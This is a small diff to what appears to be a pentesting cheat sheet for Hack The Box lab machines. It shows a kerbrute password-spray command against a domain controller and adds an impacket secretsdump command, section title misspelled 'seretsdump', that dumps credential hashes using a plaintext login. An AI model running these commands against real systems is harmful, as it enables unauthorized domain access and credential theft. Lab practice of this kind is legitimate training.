@@ -15,3 +15,9 @@
 ```
 ./kerbrute passwordspray -v --dc 10.10.10.169 -d megabank.local users.txt 'Welcome123!
 ```
+
+## seretsdump.py (impacket)
+
+```
+secretsdump.py 'htb.local/james:J@m3s_P@ssW0rd!@10.10.10.52'
+```
